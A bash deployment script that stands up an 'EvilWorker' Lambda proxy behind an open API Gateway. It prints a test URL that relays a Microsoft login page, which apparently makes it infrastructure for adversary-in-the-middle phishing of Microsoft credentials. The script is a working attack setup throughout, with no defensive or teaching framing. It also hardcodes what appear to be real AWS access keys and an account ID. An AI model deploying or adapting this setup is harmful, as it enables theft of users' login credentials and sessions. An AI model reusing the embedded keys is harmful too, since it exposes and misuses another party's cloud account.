#!/bin/bash

# EvilWorker AWS Lambda Fixed Deployment Script
echo "Starting EvilWorker AWS Lambda Fixed Deployment"
echo "=============================================="

# AWS Configuration
export AWS_ACCESS_KEY_ID="AKIA6IY35W4WKNMC43H6"
export AWS_SECRET_ACCESS_KEY="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"
export AWS_DEFAULT_REGION="us-east-1"

# Create IAM Role
echo "Creating IAM role..."
aws iam create-role \
    --role-name lambda-execution-role-fixed \
    --assume-role-policy-document '{
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "lambda.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    }' || echo "Role may already exist"

# Attach basic execution role
aws iam attach-role-policy \
    --role-name lambda-execution-role-fixed \
    --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole

# Create Lambda function
echo "Creating Lambda function..."
zip -r evilworker-lambda-fixed.zip lambda-proxy-fixed.js

aws lambda create-function \
    --function-name evilworker-proxy-fixed \
    --runtime nodejs18.x \
    --role arn:aws:iam::980921726764:role/lambda-execution-role-fixed \
    --handler lambda-proxy-fixed.handler \
    --zip-file fileb://evilworker-lambda-fixed.zip \
    --timeout 30 \
    --memory-size 256

# Create API Gateway
echo "Creating API Gateway..."
REST_API_ID=$(aws apigateway create-rest-api \
    --name evilworker-api-fixed \
    --description "EvilWorker API Gateway Fixed" \
    --query 'id' --output text)

echo "REST API ID: $REST_API_ID"

# Get root resource ID
ROOT_RESOURCE_ID=$(aws apigateway get-resources \
    --rest-api-id $REST_API_ID \
    --query 'items[0].id' --output text)

echo "Root Resource ID: $ROOT_RESOURCE_ID"

# Create proxy resource
aws apigateway create-resource \
    --rest-api-id $REST_API_ID \
    --parent-id $ROOT_RESOURCE_ID \
    --path-part '{proxy+}'

# Get the proxy resource ID
PROXY_RESOURCE_ID=$(aws apigateway get-resources \
    --rest-api-id $REST_API_ID \
    --query 'items[1].id' --output text)

echo "Proxy Resource ID: $PROXY_RESOURCE_ID"

# Create ANY method for root
aws apigateway put-method \
    --rest-api-id $REST_API_ID \
    --resource-id $ROOT_RESOURCE_ID \
    --http-method ANY \
    --authorization-type NONE

# Create ANY method for proxy
aws apigateway put-method \
    --rest-api-id $REST_API_ID \
    --resource-id $PROXY_RESOURCE_ID \
    --http-method ANY \
    --authorization-type NONE

# Get Lambda function ARN
LAMBDA_ARN=$(aws lambda get-function \
    --function-name evilworker-proxy-fixed \
    --query 'Configuration.FunctionArn' --output text)

echo "Lambda ARN: $LAMBDA_ARN"

# Add Lambda integration for root
aws apigateway put-integration \
    --rest-api-id $REST_API_ID \
    --resource-id $ROOT_RESOURCE_ID \
    --http-method ANY \
    --type AWS_PROXY \
    --integration-http-method POST \
    --uri arn:aws:apigateway:us-east-1:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations

# Add Lambda integration for proxy
aws apigateway put-integration \
    --rest-api-id $REST_API_ID \
    --resource-id $PROXY_RESOURCE_ID \
    --http-method ANY \
    --type AWS_PROXY \
    --integration-http-method POST \
    --uri arn:aws:apigateway:us-east-1:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations

# Add permission for API Gateway to invoke Lambda
aws lambda add-permission \
    --function-name evilworker-proxy-fixed \
    --statement-id apigateway-invoke \
    --action lambda:InvokeFunction \
    --principal apigateway.amazonaws.com \
    --source-arn "arn:aws:execute-api:us-east-1:980921726764:$REST_API_ID/*/*"

# Deploy API
echo "Deploying API..."
aws apigateway create-deployment \
    --rest-api-id $REST_API_ID \
    --stage-name prod

# Get the API Gateway URL
API_URL="https://$REST_API_ID.execute-api.us-east-1.amazonaws.com/prod"

echo "Deployment complete!"
echo "===================="
echo "API Gateway URL: $API_URL"
echo ""
echo "Test URL: $API_URL/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
echo ""
echo "Now test this URL in your browser to see if the Microsoft login page loads!"